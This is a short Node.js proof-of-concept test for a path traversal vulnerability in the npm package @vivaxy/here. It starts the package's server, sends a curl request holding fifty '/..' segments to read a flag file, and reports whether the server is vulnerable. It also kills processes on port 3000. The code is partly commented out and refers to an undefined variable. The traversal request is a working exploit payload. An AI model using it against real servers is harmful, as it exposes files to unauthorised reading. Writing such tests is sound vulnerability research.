var execSync = require("child_process").execSync;
// afterAll(() => {
//   try {
//     execSync("fuser -k 3000/tcp");
//   } catch (e) {}
// });
const path = require("path");
// const { sleep } = require("sleep");
const pathToFlag = path.resolve("D:\\flag.html");
function genstr(n) {
  return "/..".repeat(50) + "\\flag.html";
}
// test("Path Traversal in @vivaxy/here", (done) => {
//   expect.assertions(1);
  const fs = require("fs");
  const sleep = require("sleep");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  try {
    a.execSync("fuser -k 3000/tcp", () => {});
  } catch (e) {}
  let server = "node ../node_modules/@vivaxy/here/index.js";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is "http://172.25.48.1:3015${genstr()}"`;
  exec(attack_string, (error, stdout) => {
if (stdout == hostsFile) {
	console.log("this_is_vulnerable")
	process.exit(0);
} else {
	console.log("this_is_OK")
	process.exit(0);
}
//     done();
  });
// });
